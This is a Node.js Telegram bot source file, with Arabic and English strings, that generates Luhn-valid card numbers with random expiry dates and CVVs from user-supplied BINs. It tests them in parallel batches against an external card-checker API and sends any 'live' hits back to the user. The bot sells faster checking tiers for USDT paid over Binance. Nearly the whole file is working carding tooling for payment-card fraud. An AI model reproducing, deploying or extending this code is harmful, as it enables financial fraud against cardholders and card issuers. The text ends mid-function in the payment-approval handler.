const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const express = require('express');

// ==========================================
// 🛡️ موانع الانهيار (Anti-Crash) لضمان عدم توقف البوت
// ==========================================
process.on('uncaughtException', (err) => { console.error('⚠️ Uncaught Exception:', err.message); });
process.on('unhandledRejection', (reason, promise) => { console.error('⚠️ Unhandled Rejection:', reason); });

// ==========================================
// إعدادات البيئة والخادم (لإبقاء البوت يعمل على الاستضافات)
// ==========================================
const app = express();
const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('✅ Bot is running perfectly!'));
app.listen(PORT, () => console.log(`🌐 Server is running on port ${PORT}`)).on('error', (err) => console.error('Express Error:', err.message));

const TOKEN = process.env.TOKEN; 
if (!TOKEN) {
    console.error('❌ توكن البوت غير موجود! تأكد من إضافته في متغيرات البيئة (TOKEN).');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });
bot.on('polling_error', (error) => { console.error('⚠️ Polling Error:', error.message); });

// ==========================================
// المتغيرات العامة
// ==========================================
const MAIN_ADMIN = 643309456; // 👈 هذا معرفك كأدمن أساسي
const adminSet = new Set([MAIN_ADMIN]);
const userLang = new Map();
const userStates = new Map();          
const activeJobs = new Map();          
const BINANCE_PAY_ID = '842505320';

// ==========================================
// الترجمات
// ==========================================
const translations = {
    ar: {
        main_menu: '✨ *القائمة الرئيسية* ✨\nاختر أحد الخيارين:',
        btn_guess: '🎲 تخمين مجموعة فيزات',
        btn_single: '🔍 فحص فيزا واحدة',
        btn_subscribe: '💎 الاشتراكات',
        btn_my_campaigns: '📋 حملاتي النشطة',
        cancel_btn: '❌ إلغاء',
        btn_copy_full: '📋 نسخ الفيزا كاملة',
        btn_copy_num: '🔢 نسخ الرقم',
        btn_copy_exp: '📅 نسخ التاريخ',
        btn_copy_cvv: '🔐 نسخ CVV',
        enter_bin: '📌 أرسل الـ BIN الخاص بك (أول 6 أرقام أو أكثر)\nمثال: `62581`\nيمكنك إرسال عدة BINs',
        count_out_of_range: '⚠️ العدد يجب أن يكون بين 5 و {max}.',
        cancel_msg: '❌ تم إلغاء العملية.',
        live_result: '✅ تعمل بنجاح ✅\n----------------------------------------\n\n💳    `{card}`\n\n📊 الحالة: تعمل ✅\n\n🏦 النوع: {type}\n\n🌍 البلد: {country} {flag}\n\n----------------------------------------\nبواسطة: @pe8bot',
        no_live_found: '😞 لم يتم العثور على أي بطاقة صالحة من أصل {total}.',
        new_campaign_btn: '🚀 بدء حملة جديدة',
        summary: '📊 *الملخص النهائي*\n✅ الصالحة: {hit}\n🎯 المجموع: {total}',
        single_invalid: '📌 أرسل الفيزا كاملة بهذا التنسيق:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ جاري فحص البطاقة...',
        api_error: '⚠️ حدث خطأ أثناء الاتصال بالخدمة. يرجى المحاولة لاحقاً.',
        not_admin: '⛔ هذا الأمر للأدمن فقط.',
        subscription_plans: '💎 *خطط الاشتراك*\nاختر الخطة التي تناسبك:',
        already_subscribed: '✅ أنت مشترك بالفعل في خطة {plan}.',
        upgrade_to_pro: '🚀 تطوير إلى Pro',
        upgrade_to_vip: '🚀 تطوير إلى VIP',
        upgrade_suggestion: 'يمكنك ترقية اشتراكك الآن:',
        subscribe_confirm: '✅ اخترت خطة {plan}\nقم بتحويل {amount} USDT إلى معرف بايننس (Binance Pay ID):\n`{payId}`\nواكتب هذا الكود في ملاحظات التحويل (Memo/Notes):\n`{code}`\n\n📸 *بعد التحويل، أرسل صورة الإثبات هنا مباشرة.*',
        payment_timeout: '⚠️ انتهى وقت الانتظار. أرسل صورة التحويل متى ما قمت بالدفع.',
        payment_received: '📸 تم استلام صورة الإثبات. سيتم مراجعتها من قبل الإدارة قريباً.',
        payment_approved: '🎉 مبروك! تم تفعيل اشتراك {plan} بنجاح.',
        payment_rejected: '❌ عذراً، تم رفض طلب الاشتراك لعدم تطابق بيانات الدفع.',
        campaigns_limit_reached: '⚠️ لقد وصلت للحد الأقصى للحملات المتزامنة ({limit}) المسموح بها في خطتك.',
        campaign_stopped: '🛑 تم إيقاف الحملة بنجاح.',
        btn_stop_camp: '🛑 إيقاف الحملة',
        no_active_campaigns: '⚠️ لا توجد أي حملات نشطة حالياً.',
        active_campaigns: '📋 *حملاتي النشطة*\n'
    },
    en: {
        main_menu: '✨ *Main Menu* ✨\nChoose an option:',
        btn_guess: '🎲 Guess multiple cards',
        btn_single: '🔍 Check single card',
        btn_subscribe: '💎 Subscriptions',
        btn_my_campaigns: '📋 My active campaigns',
        cancel_btn: '❌ Cancel',
        btn_copy_full: '📋 Copy full card',
        btn_copy_num: '🔢 Copy number',
        btn_copy_exp: '📅 Copy expiry',
        btn_copy_cvv: '🔐 Copy CVV',
        enter_bin: '📌 Send your BIN (first 6 digits or more)\nExample: `62581`\nYou can send multiple BINs',
        count_out_of_range: '⚠️ Count must be between 5 and {max}.',
        cancel_msg: '❌ Operation cancelled.',
        live_result: '✅ LIVE ✅\n----------------------------------------\n\n💳    `{card}`\n\n📊 Status: LIVE ✅\n\n🏦 Type: {type}\n\n🌍 Country: {country} {flag}\n\n----------------------------------------\nBy: @pe8bot',
        no_live_found: '😞 No live cards found out of {total}.',
        new_campaign_btn: '🚀 Start new campaign',
        summary: '📊 *Final Summary*\n✅ Live: {hit}\n🎯 Total: {total}',
        single_invalid: '📌 Send the full card in this format:\n`4111111111111111|01|2031|123`',
        single_checking: '⏳ Checking card...',
        api_error: '⚠️ API error. Please try again later.',
        not_admin: '⛔ This command is for admins only.',
        subscription_plans: '💎 *Subscription Plans*\nChoose your plan:',
        already_subscribed: '✅ You are already subscribed to {plan} plan.',
        upgrade_to_pro: '🚀 Upgrade to Pro',
        upgrade_to_vip: '🚀 Upgrade to VIP',
        upgrade_suggestion: 'You can upgrade your subscription now:',
        subscribe_confirm: '✅ You selected {plan} plan\nPlease send {amount} USDT to Binance Pay ID:\n`{payId}`\nAnd write this code in the memo/notes:\n`{code}`\n\n📸 *After payment, send the screenshot proof here directly.*',
        payment_timeout: '⚠️ Timeout. Please send the payment proof photo whenever you are ready.',
        payment_received: '📸 Payment proof received. It will be reviewed by admins soon.',
        payment_approved: '🎉 Congratulations! Your {plan} subscription has been activated.',
        payment_rejected: '❌ Sorry, your subscription request was rejected.',
        campaigns_limit_reached: '⚠️ You have reached the maximum concurrent campaigns ({limit}) for your plan.',
        campaign_stopped: '🛑 Campaign stopped successfully.',
        btn_stop_camp: '🛑 Stop Campaign',
        no_active_campaigns: '⚠️ No active campaigns found.',
        active_campaigns: '📋 *Your active campaigns*\n'
    }
};

// ==========================================
// قاعدة بيانات JSON (مع حماية ضد تلف الملف)
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    try { 
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8')); 
    } catch(e) { 
        console.error('⚠️ Data File Corrupted, loading defaults.');
        return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null }; 
    }
}

function saveData(data) { 
    try { fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2)); } 
    catch(e) { console.error('⚠️ Save Data Error:', e.message); } 
}

function getPlans() {
    const data = loadData();
    if (!data.plans) {
        data.plans = {
            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 15, campaignsLimit: 2, speed: 20 },
            plus: { nameAr: 'بلاس (Plus)', nameEn: 'Plus', price: 3, cardsLimit: 70, campaignsLimit: 3, speed: 30 },
            pro: { nameAr: 'برو (Pro)', nameEn: 'Pro', price: 5, cardsLimit: 150, campaignsLimit: 5, speed: 60 },
            vip: { nameAr: 'كبار الشخصيات (VIP)', nameEn: 'VIP', price: 8, cardsLimit: 350, campaignsLimit: 7, speed: 80 }
        };
        saveData(data);
    }
    return data.plans;
}

function updatePlans(newPlans) { const d = loadData(); d.plans = newPlans; saveData(d); }

function getSubscriber(userId) {
    const data = loadData();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = { plan: 'free', startDate: new Date().toISOString(), endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString() };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free'; sub.startDate = new Date().toISOString(); sub.endDate = new Date(Date.now() + 365*24*60*60*1000).toISOString();
        saveData(data);
    }
    return sub;
}

function updateSubscriber(userId, updates) { const d = loadData(); d.subscribers[userId] = { ...d.subscribers[userId], ...updates }; saveData(d); }
function getAllSubscribers() { return loadData().subscribers; }
function getUserActiveCampaigns(userId) { return Object.values(loadData().campaigns).filter(c => c.userId === userId && c.status === 'running'); }
function createCampaign(userId, bin, total) { const d = loadData(); const id = Date.now() + Math.random(); d.campaigns[id] = { id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString() }; saveData(d); return id; }
function updateCampaign(campaignId, current, hit, status) { const d = loadData(); if (d.campaigns[campaignId]) { if (current !== undefined) d.campaigns[campaignId].current = current; if (hit !== undefined) d.campaigns[campaignId].hit = hit; if (status !== undefined) d.campaigns[campaignId].status = status; saveData(d); } }
function createPendingPayment(userId, plan, code) { const d = loadData(); const p = getPlans()[plan]; d.pendingPayments.push({ id: Date.now() + Math.random(), userId, plan, amount: p.price, code, status: 'waiting_payment', createdAt: new Date().toISOString() }); saveData(d); }
function getPendingPayment(userId, plan) { return loadData().pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment'); }
function updatePendingPayment(id, status) { const d = loadData(); const idx = d.pendingPayments.findIndex(p => p.id === id); if (idx !== -1) d.pendingPayments[idx].status = status; saveData(d); }
function createPaymentProof(userId, plan, photoFileId, messageId) { const d = loadData(); const proof = { id: Date.now() + Math.random(), userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString() }; d.paymentProofs.push(proof); saveData(d); return proof; }
function getPaymentProof(id) { return loadData().paymentProofs.find(p => p.id === id); }
function updatePaymentProof(id, status) { const d = loadData(); const idx = d.paymentProofs.findIndex(p => p.id === id); if (idx !== -1) d.paymentProofs[idx].status = status; saveData(d); }

// ==========================================
// دوال مساعدة
// ==========================================
const countryFlags = { 'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸', 'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦', 'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧', 'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷', 'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸', 'canada': '🇨🇦', 'australia': '🇦🇺' };
function getFlag(cn) { if (!cn) return '🌍'; const l = cn.toLowerCase(); for (const [k, f] of Object.entries(countryFlags)) if (l.includes(k)) return f; return '🌍'; }
function getCardType(cn) { const f=cn[0], t=cn.slice(0,2), fo=cn.slice(0,4); if(f==='4') return 'فيزا كارد'; if(t>='51'&&t<='55') return 'ماستر كارد'; if(t==='34'||t==='37') return 'امريكان اكسبريس'; if(fo==='6011'||t==='65'||(t>='64'&&t<='65')) return 'ديسكفر'; if(t==='35') return 'جيه سي بي'; return 'بطاقة ائتمانية'; }
function checkLuhn(card) { let sum=0, alt=false; for(let i=card.length-1;i>=0;i--){ let d=parseInt(card[i],10); if(alt){ d*=2; if(d>9) d-=9; } sum+=d; alt=!alt; } return sum%10===0; }
function randMonth() { return String(Math.floor(Math.random()*12)+1).padStart(2,'0'); }
function randYear() { return String(new Date().getFullYear() + Math.floor(Math.random()*5)); }
function randCVV() { return String(Math.floor(Math.random()*900)+100); }
function genCardNumber(bin, len=16) { let card=bin; while(card.length<len-1) card+=Math.floor(Math.random()*10); for(let i=0;i<=9;i++){ const t=card+i; if(checkLuhn(t)) return t; } return card+'0'; }
function genFullVisa(bin) { return `${genCardNumber(bin)}|${randMonth()}|${randYear()}|${randCVV()}`; }
function genRandomCode() { return Math.random().toString(36).substring(2,10).toUpperCase(); }

async function checkSingleCard(cardString, chatId, isSilent=false, retries=2) { 
    try { 
        const r=await axios.post('https://api.chkr.cc/',{data:cardString},{headers:{'User-Agent':'Mozilla/5.0','Content-Type':'application/json'},timeout:10000}); 
        const d=r.data; 
        const live=(d.code===1); 
        if(!live && !isSilent) return null; 
        return { isLive:live, status:d.status||'غير معروف', message:(d.message||'').replace(/احذفها/gi,'').trim(), type:(d.card&&d.card.type)||getCardType(cardString.split('|')[0]), country:(d.card&&d.card.country&&d.card.country.name)||'غير معروف' }; 
    } catch(e){ 
        if(retries>0) return checkSingleCard(cardString,chatId,isSilent,retries-1); 
        if(!isSilent){ const l=userLang.get(chatId)||'ar'; await bot.sendMessage(chatId,translations[l].api_error).catch(()=>{}); } 
        return null; 
    } 
}

function getCopyButtons(fullCard, lang) { 
    const [num,month,year,cvv]=fullCard.split('|'); 
    const d=translations[lang]; 
    return { reply_markup:{ inline_keyboard:[[{text:d.btn_copy_full,callback_data:`copy_full_${fullCard}`}],[{text:d.btn_copy_num,callback_data:`copy_num_${num}`}],[{text:d.btn_copy_exp,callback_data:`copy_exp_${month}|${year}`}],[{text:d.btn_copy_cvv,callback_data:`copy_cvv_${cvv}`}]] } }; 
}
function formatProgressBar(percent, width=10) { const filled=Math.round(percent/100*width); return '▰'.repeat(filled)+'▱'.repeat(width-filled); }
function buildProgressText(campaignsData, speedPercent) { let txt=`🔄 جاري إنشاء و فحص الفيزا\n⚡ السرعة: ${speedPercent}%\n`; for(const d of campaignsData){ const pct=d.total>0?(d.current/d.total*100):0; const bar=formatProgressBar(pct); const rem=d.total-d.current; txt+=`\n📌 المنفذ: ${d.bin}\n${bar} ${pct.toFixed(1)}%\n⏳ العد التنازلي: ${rem} بطاقة متبقية\n`; } txt+='\n━━━━━━━━━━━━━━'; return txt; }

// ==========================================
// تشغيل حملات متعددة بالتوازي
// ==========================================
async function runMultipleCampaignsParallel(chatId, binsList, totalCardsPerBin) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const plans = getPlans();
    const allowedCampaigns = plans[planName].campaignsLimit;
    const speedPercent = plans[planName].speed;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];

    if (binsList.length > allowedCampaigns) {
        await bot.sendMessage(chatId, dict.campaigns_limit_reached.replace('{limit}', allowedCampaigns)).catch(()=>{});
        return;
    }

    if (activeJobs.has(chatId)) {
        await bot.sendMessage(chatId, '⚠️ هناك حملات جارية حالياً. استخدم /cancel أولاً للإلغاء.').catch(()=>{});
        return;
    }
    activeJobs.set(chatId, { cancel: false });

    const campaignsData = [];
    for (const bin of binsList) {
        const cid = createCampaign(chatId, bin, totalCardsPerBin);
        campaignsData.push({ bin, cid, total: totalCardsPerBin, current: 0, hit: 0 });
    }

    let progressMsg;
    try {
        progressMsg = await bot.sendMessage(chatId, buildProgressText(campaignsData, speedPercent), { reply_markup: { inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_all_campaigns' }]] } });
    } catch(e) { console.error('Failed to send progress msg:', e.message); return; }

    const updateProgress = async () => {
        if (activeJobs.get(chatId)?.cancel) return;
        try { 
            await bot.editMessageText(buildProgressText(campaignsData, speedPercent), { chat_id: chatId, message_id: progressMsg.message_id, reply_markup: { inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_all_campaigns' }]] } }); 
        } catch(e) { /* تجاهل أخطاء التعديل المتكرر */ }
    };

    const runSingle = async (camp) => {
        const bin = camp.bin;
        const total = camp.total;
        const numPorts = Math.max(1, Math.min(10, Math.floor(speedPercent / 10) + 1));
        const cardsPerPort = Math.floor(total / numPorts);
        const remainder = total % numPorts;

        const allVisas = [];
        for (let i = 0; i < total; i++) allVisas.push(genFullVisa(bin));

        const portVisas = [];
        let start = 0;
        for (let p = 0; p < numPorts; p++) {
            const cnt = (p === numPorts-1) ? cardsPerPort + remainder : cardsPerPort;
            if (cnt === 0) continue;
            portVisas.push(allVisas.slice(start, start+cnt));
            start += cnt;
        }

        const portResults = await Promise.all(portVisas.map(async (visas) => {
            let portHit = 0;
            const batchSize = 5; 
            for (let i = 0; i < visas.length; i += batchSize) {
                if (!activeJobs.has(chatId) || activeJobs.get(chatId)?.cancel) break;
                const batch = visas.slice(i, i+batchSize);
                const results = await Promise.all(batch.map(v => checkSingleCard(v, chatId, true)));
                for (let j=0; j<results.length; j++) {
                    const res = results[j];
                    if (res && res.isLive) {
                        portHit++; camp.hit++;
                        const flag = getFlag(res.country);
                        const cardType = getCardType(batch[j].split('|')[0]);
                        const liveText = dict.live_result.replace('{card}', batch[j]).replace('{type}', cardType).replace('{country}', res.country).replace('{flag}', flag);
                        const buttons = getCopyButtons(batch[j], lang);
                        await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons }).catch(()=>{});
                        try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
                        try { progressMsg = await bot.sendMessage(chatId, buildProgressText(campaignsData, speedPercent), { reply_markup: { inline_keyboard: [[{ text: dict.cancel_btn, callback_data: 'cancel_all_campaigns' }]] } }); } catch(e) {}
                    }
                }
                camp.current = Math.min(camp.current + batch.length, camp.total);
                await updateProgress();
            }
            return portHit;
        }));
        const totalHits = portResults.reduce((a,b)=>a+b,0);
        updateCampaign(camp.cid, camp.total, totalHits, 'completed');
        return totalHits;
    };

    const allHits = await Promise.all(campaignsData.map(c => runSingle(c)));
    const totalHits = allHits.reduce((a,b)=>a+b,0);

    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
    activeJobs.delete(chatId);
    userStates.delete(chatId);

    if (totalHits === 0) {
        const noLive = dict.no_live_found.replace('{total}', binsList.length * totalCardsPerBin);
        await bot.sendMessage(chatId, noLive, { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } }).catch(()=>{});
    } else {
        await bot.sendMessage(chatId, dict.summary.replace('{hit}', totalHits).replace('{total}', binsList.length * totalCardsPerBin)).catch(()=>{});
    }
}

// ==========================================
// القوائم والاشتراكات
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const subscriber = getSubscriber(chatId);
    const plans = getPlans();
    
    if (subscriber.plan === plan) {
        await bot.sendMessage(chatId, dict.already_subscribed.replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`])).catch(()=>{});
        const up = [];
        if (plan === 'plus') up.push({ text: dict.upgrade_to_pro, callback_data: 'sub_pro' });
        if (plan === 'pro') up.push({ text: dict.upgrade_to_vip, callback_data: 'sub_vip' });
        if (up.length) await bot.sendMessage(chatId, dict.upgrade_suggestion, { reply_markup: { inline_keyboard: [up] } }).catch(()=>{});
        return;
    }
    
    const code = genRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm
        .replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`])
        .replace('{amount}', plans[plan].price)
        .replace('{payId}', BINANCE_PAY_ID)
        .replace('{code}', code);
        
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' }).catch(()=>{});
    setTimeout(async () => { 
        const p = getPendingPayment(chatId, plan); 
        if(p && p.status === 'waiting_payment') await bot.sendMessage(chatId, dict.payment_timeout).catch(()=>{}); 
    }, 20000);
}

async function showMainMenu(chatId) {
    const lang = userLang.get(chatId)||'ar', dict=translations[lang];
    const kb = { inline_keyboard: [
        [{text:dict.btn_guess,callback_data:'menu_guess'}],
        [{text:dict.btn_single,callback_data:'menu_single'}],
        [{text:dict.btn_subscribe,callback_data:'menu_subscribe'}],
        [{text:dict.btn_my_campaigns,callback_data:'menu_my_campaigns'}]
    ] };
    if(adminSet.has(chatId)) kb.inline_keyboard.push([{text:'⚙️ إدارة البوت',callback_data:'admin_panel'}]);
    await bot.sendMessage(chatId, dict.main_menu, { reply_markup: kb, parse_mode: 'Markdown' }).catch(()=>{});
}

async function showSubscriptionMenu(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], plans=getPlans();
    const btns=[]; 
    for(const [k,p] of Object.entries(plans)) {
        if(k!=='free') btns.push([{text:`${p[`name${lang==='ar'?'Ar':'En'}`]} - ${p.price} USDT`,callback_data:`sub_${k}`}]);
    }
    btns.push([{text:dict.cancel_btn,callback_data:'cancel_guess'}]);
    await bot.sendMessage(chatId, dict.subscription_plans, { reply_markup: { inline_keyboard: btns }, parse_mode: 'Markdown' }).catch(()=>{});
}

async function showMyCampaigns(chatId) {
    const lang=userLang.get(chatId)||'ar', dict=translations[lang], camps=getUserActiveCampaigns(chatId);
    if(camps.length===0){ await bot.sendMessage(chatId, dict.no_active_campaigns).catch(()=>{}); return; }
    let txt=dict.active_campaigns; 
    const btns=[];
    for(const c of camps){ 
        txt+=`\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`; 
        btns.push([{text:`${dict.btn_stop_camp} (BIN: ${c.bin})`, callback_data:`stop_camp_${c.id}`}]); 
    }
    btns.push([{text:dict.new_campaign_btn,callback_data:'menu_guess'}]);
    await bot.sendMessage(chatId, txt, { reply_markup: { inline_keyboard: btns } }).catch(()=>{});
}

async function showAdminPanel(chatId) {
    await bot.sendMessage(chatId, '⚙️ *لوحة تحكم الأدمن*', { parse_mode: 'Markdown', reply_markup: { inline_keyboard: [
        [{text:'💰 تعديل الأسعار',callback_data:'admin_edit_prices'}, {text:'⚡ تعديل السرعة',callback_data:'admin_edit_speed'}],
        [{text:'➕ إضافة خطة',callback_data:'admin_add_plan'}, {text:'📋 عرض الأعضاء',callback_data:'admin_list'}],
        [{text:'🎁 منح اشتراك',callback_data:'admin_grant'}, {text:'❌ إلغاء اشتراك',callback_data:'admin_remove'}],
        [{text:'🔙 رجوع للقائمة',callback_data:'main_menu'}]
    ] } }).catch(()=>{});
}

// ==========================================
// معالجة الأوامر 
// ==========================================
bot.onText(/\/start/, async (msg) => { 
    const cid=msg.chat.id; 
    userStates.delete(cid);
    await bot.sendMessage(cid, 'اختر لغتك / Choose your language:', { reply_markup:{ inline_keyboard:[[{text:'العربية 🇸🇦',callback_data:'lang_ar'},{text:'English 🇺🇸',callback_data:'lang_en'}]] } }).catch(()=>{}); 
});
bot.onText(/\/menu/, async (msg) => { await showMainMenu(msg.chat.id); });
bot.onText(/\/cancel/, async (msg) => { 
    const cid=msg.chat.id; 
    userStates.delete(cid);
    if(activeJobs.has(cid)){ 
        activeJobs.get(cid).cancel=true; 
        activeJobs.delete(cid); 
        await bot.sendMessage(cid, '❌ تم إلغاء جميع الحملات الجارية.').catch(()=>{}); 
    } else {
        const lang = userLang.get(cid) || 'ar';
        await bot.sendMessage(cid, translations[lang].cancel_msg).catch(()=>{}); 
    }
});
bot.onText(/\/addadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(!isNaN(id)) adminSet.add(id); await bot.sendMessage(cid, `✅ تم إضافة أدمن ${id}`).catch(()=>{}); });
bot.onText(/\/removeadmin (.+)/, async (msg, match) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; const id=parseInt(match[1]); if(id===MAIN_ADMIN){ await bot.sendMessage(cid,'⚠️ لا يمكن إزالة الأدمن الأساسي').catch(()=>{}); return; } adminSet.delete(id); await bot.sendMessage(cid,`✅ تم إزالة أدمن ${id}`).catch(()=>{}); });
bot.onText(/\/admins/, async (msg) => { const cid=msg.chat.id; if(!adminSet.has(cid)) return; await bot.sendMessage(cid, `📋 قائمة الأدمن:\n${Array.from(adminSet).join('\n')}`).catch(()=>{}); });

// ==========================================
// معالجة الأزرار (Callback Queries)
// ==========================================
bot.on('callback_query', async (query) => {
    const cid=query.message.chat.id, data=query.data, lang=userLang.get(cid)||'ar', dict=translations[lang];
    bot.answerCallbackQuery(query.id).catch(()=>{});
    
    if(data.startsWith('copy_full_')){ await bot.sendMessage(cid,`\`${data.replace('copy_full_','')}\``,{parse_mode:'Markdown'}).catch(()=>{}); return; }
    if(data.startsWith('copy_num_')){ await bot.sendMessage(cid,`\`${data.replace('copy_num_','')}\``,{parse_mode:'Markdown'}).catch(()=>{}); return; }
    if(data.startsWith('copy_exp_')){ await bot.sendMessage(cid,`\`${data.replace('copy_exp_','')}\``,{parse_mode:'Markdown'}).catch(()=>{}); return; }
    if(data.startsWith('copy_cvv_')){ await bot.sendMessage(cid,`\`${data.replace('copy_cvv_','')}\``,{parse_mode:'Markdown'}).catch(()=>{}); return; }
    
    if(data==='lang_ar'){ userLang.set(cid,'ar'); await bot.sendMessage(cid,'✅ تم اختيار اللغة العربية').catch(()=>{}); await showMainMenu(cid); return; }
    if(data==='lang_en'){ userLang.set(cid,'en'); await bot.sendMessage(cid,'✅ Language set to English').catch(()=>{}); await showMainMenu(cid); return; }
    
    if(data==='menu_guess'){ userStates.set(cid,{step:'awaiting_bin',bins:[],defaultCount:null}); await bot.sendMessage(cid, dict.enter_bin, { parse_mode:'Markdown' }).catch(()=>{}); return; }
    if(data==='menu_single'){ await bot.sendMessage(cid, dict.single_invalid, { parse_mode:'Markdown' }).catch(()=>{}); return; }
    if(data==='menu_subscribe'){ await showSubscriptionMenu(cid); return; }
    if(data==='menu_my_campaigns'){ await showMyCampaigns(cid); return; }
    
    if(data==='add_another_bin'){ 
        const st=userStates.get(cid); 
        if(st && st.step==='awaiting_decision'){ 
            const sub=getSubscriber(cid), plans=getPlans(), maxC=plans[sub.plan].campaignsLimit; 
            if(st.bins.length>=maxC){ 
                await bot.sendMessage(cid, dict.campaigns_limit_reached.replace('{limit}', maxC), { reply_markup:{ inline_keyboard:[[{text:'🚀 ترقية الاشتراك',callback_data:'menu_subscribe'}]] } }).catch(()=>{}); return; 
            } 
            st.step='awaiting_bin'; 
            await bot.sendMessage(cid,'📌 أرسل الـ BIN التالي:').catch(()=>{}); 
        } 
        return; 
    }
    if(data==='set_default_count'){ const st=userStates.get(cid); if(st && st.bins.length>0){ st.step='awaiting_default_count'; await bot.sendMessage(cid,'🔢 أدخل العدد الذي تريد تخمينه لكل حملة (سيتم تطبيقه على جميع BINs الحالية والمستقبلية):').catch(()=>{}); } else await bot.sendMessage(cid,'⚠️ يرجى إدخال BIN أولاً.').catch(()=>{}); return; }
    if(data==='start_with_default' || data==='start_campaigns'){ const st=userStates.get(cid); if(!st || st.bins.length===0){ await bot.sendMessage(cid,'⚠️ لم تقم بإدخال أي BIN بعد.').catch(()=>{}); return; } if(!st.defaultCount){ await bot.sendMessage(cid,'⚠️ يرجى تعيين العدد الافتراضي أولاً.').catch(()=>{}); return; } st.step='running'; await runMultipleCampaignsParallel(cid, st.bins, st.defaultCount); return; }
    
    if(data==='cancel_all_campaigns'){ if(activeJobs.has(cid)){ activeJobs.get(cid).cancel=true; activeJobs.delete(cid); await bot.sendMessage(cid,'❌ تم إيقاف عملية التخمين.').catch(()=>{}); } return; }
    if(data==='cancel_guess'){ userStates.delete(cid); await bot.sendMessage(cid, dict.cancel_msg).catch(()=>{}); return; }
    if(data.startsWith('stop_camp_')){ const campId=parseFloat(data.split('_')[2]); updateCampaign(campId,null,null,'stopped'); await bot.sendMessage(cid, dict.campaign_stopped).catch(()=>{}); await showMyCampaigns(cid); return; }
    
    if(data.startsWith('sub_')){ await handleSubscription(cid, data.replace('sub_','')); return; }
    
    if(data==='admin_panel'){ if(!adminSet.has(cid)){ await bot.sendMessage(cid, dict.not_admin).catch(()=>{}); return; } await showAdminPanel(cid); return; }
    if(data==='admin_edit_prices'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_edit_price'}); await bot.sendMessage(cid,'أرسل الخطة والسعر الجديد بالصيغة: plan=price\nمثال: plus=4').catch(()=>{}); return; }
    if(data==='admin_edit_speed'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_edit_speed'}); await bot.sendMessage(cid,'أرسل الخطة والسرعة الجديدة بالصيغة: plan=speed\nمثال: pro=80').catch(()=>{}); return; }
    if(data==='admin_add_plan'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_add_plan'}); await bot.sendMessage(cid,'أرسل تفاصيل الخطة: name_ar|name_en|price|cardsLimit|campaignsLimit|speed\nمثال: ماكس|MAX|10|500|10|100').catch(()=>{}); return; }
    if(data==='admin_grant'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_grant'}); await bot.sendMessage(cid,'أرسل: user_id plan\nمثال: 123456789 plus').catch(()=>{}); return; }
    if(data==='admin_remove'){ if(!adminSet.has(cid)) return; userStates.set(cid,{step:'admin_remove'}); await bot.sendMessage(cid,'أرسل معرف المستخدم لإلغاء اشتراكه:').catch(()=>{}); return; }
    if(data==='admin_list'){ if(!adminSet.has(cid)) return; const subs=getAllSubscribers(); let msg='📋 *قائمة الأعضاء:*\n\n'; for(const [id,sub] of Object.entries(subs)) { if(sub.plan !== 'free') msg+=`🆔 \`${id}\` | خطة: ${sub.plan} \n📅 ينتهي: ${sub.endDate.split('T')[0]}\n\n`; } await bot.sendMessage(cid, msg, {parse_mode: 'Markdown'}).catch(()=>{}); return; }
    if(data==='main_menu'){ await showMainMenu(cid); return; }
    
    if(data.startsWith('approve_payment_')||data.startsWith('reject_payment_')){ 
        if(!adminSet.has(cid)) return; 
        const parts=data.split('_'), action=parts[0], proofId=parseFloat(parts[2]), proof=getPaymentProof(proofId); 
        if(proof && proof.status === 'pending'){ 
            const plans=getPlans(); 
